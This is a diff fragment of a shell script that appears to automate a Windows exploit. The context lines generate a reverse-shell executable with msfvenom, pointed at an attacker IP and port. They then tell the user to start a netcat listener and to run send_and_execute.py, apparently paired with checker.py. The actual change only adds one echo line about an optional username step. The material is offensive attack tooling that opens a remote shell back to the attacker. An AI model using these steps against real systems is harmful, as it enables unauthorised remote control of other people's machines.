@@ -46,6 +46,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$attackerPort -f e
 
 clear
 echo "Payload generated! Last step!"
+echo "IF YOU DID NOT SPECIFY ANY USERNAME ON THE CHECKER.PY, YOU CAN SKIP THE MESSAGE BELOW"
 echo "Add the same username as you did with checker.py, to send_and_execute.py"
 echo "And run nc -lvnp <Port> that you specify earlier"
 read -p "Once you are ready, Press the enter key!"
